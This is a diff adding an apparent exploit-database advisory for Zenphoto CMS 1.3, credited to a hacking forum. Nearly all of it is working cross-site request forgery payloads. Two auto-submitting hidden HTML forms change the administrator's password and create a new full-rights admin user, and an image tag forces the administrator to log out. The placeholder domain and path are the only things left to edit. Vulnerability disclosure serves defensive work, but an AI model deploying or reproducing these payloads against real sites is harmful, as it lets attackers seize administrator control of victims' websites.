@@ -1,0 +1,91 @@
+<!---
+    Title: Zenphoto CMS 1.3 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Wed 14 Jul 2010 12:48:56 PM EEST 
+    Vendor: http://www.zenphoto.org/
+    Download: http://zenphoto.googlecode.com/files/zenphoto-1.3.tar.gz
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Zenphoto CMS 1.3 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/[path]/zp-core/admin-users.php?action=saveoptions" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="0-admin_name" value="root" />
+                <input type="hidden" name="0-admin_email" value="root@root.com" />
+                <input type="hidden" name="0-adminpass" value="rootroot" />
+                <input type="hidden" name="0-adminpass_2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="saveadminoptions" value="yes" />
+                <input type="hidden" name="alter_enabled" value="1" />
+                <input type="hidden" name="show-admin" value="1" />
+                <input type="hidden" name="0-adminuser" value="admin" />
+                <input type="hidden" name="0-confirmed" value="2" />
+                <input type="hidden" name="0-ADMIN_RIGHTS" value="65536" />
+                <input type="hidden" name="0-OPTIONS_RIGHTS" value="8192" />
+                <input type="hidden" name="0-TAGS_RIGHTS" value="4096" />
+                <input type="hidden" name="0-ZENPAGE_RIGHTS" value="2049" />
+                <input type="hidden" name="0-THEMES_RIGHTS" value="1024" />
+                <input type="hidden" name="0-MANAGE_ALL_ALBUM_RIGHTS" value="512" />
+                <input type="hidden" name="0-ALBUM_RIGHTS" value="256" />
+                <input type="hidden" name="0-COMMENT_RIGHTS" value="64" />
+                <input type="hidden" name="0-POST_COMMENT_RIGHTS" value="32" />
+                <input type="hidden" name="0-UPLOAD_RIGHTS" value="16" />
+                <input type="hidden" name="0-VIEW_ALL_RIGHTS" value="8" />
+                <input type="hidden" name="0-OVERVIEW_RIGHTS" value="4" />
+                <input type="hidden" name="show-" value="16" />
+                <input type="hidden" name="totaladmins" value="1" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Zenphoto CMS 1.3 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/[path]/zp-core/admin-users.php?action=saveoptions" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="1-adminuser" value="root" />
+                <input type="hidden" name="1-adminpass" value="rootroot" />
+                <input type="hidden" name="1-adminpass_2" value="rootroot" />
+                <input type="hidden" name="1-admin_name" value="root" />
+                <input type="hidden" name="1-admin_email" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="saveadminoptions" value="yes" />
+                <input type="hidden" name="alter_enabled" value="1" />
+                <input type="hidden" name="show-admin" value="1" />
+                <input type="hidden" name="1-ADMIN_RIGHTS" value="65536" />
+                <input type="hidden" name="1-OPTIONS_RIGHTS" value="8192" />
+                <input type="hidden" name="1-TAGS_RIGHTS" value="4096" />
+                <input type="hidden" name="1-ZENPAGE_RIGHTS" value="2049" />
+                <input type="hidden" name="1-THEMES_RIGHTS" value="1024" />
+                <input type="hidden" name="1-MANAGE_ALL_ALBUM_RIGHTS" value="512" />
+                <input type="hidden" name="1-ALBUM_RIGHTS" value="256" />
+                <input type="hidden" name="1-COMMENT_RIGHTS" value="64" />
+                <input type="hidden" name="1-POST_COMMENT_RIGHTS" value="32" />
+                <input type="hidden" name="1-UPLOAD_RIGHTS" value="16" />
+                <input type="hidden" name="1-VIEW_ALL_RIGHTS" value="8" />
+                <input type="hidden" name="1-OVERVIEW_RIGHTS" value="4" />
+                <input type="hidden" name="show-" value="16" />
+                <input type="hidden" name="1-newuser" value="1" />
+                <input type="hidden" name="1-confirmed" value="2" />
+                <input type="hidden" name="totaladmins" value="2" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 3 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/[path]/zp-core/admin.php?logout=0" alt="Do you see this?" />
+    
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
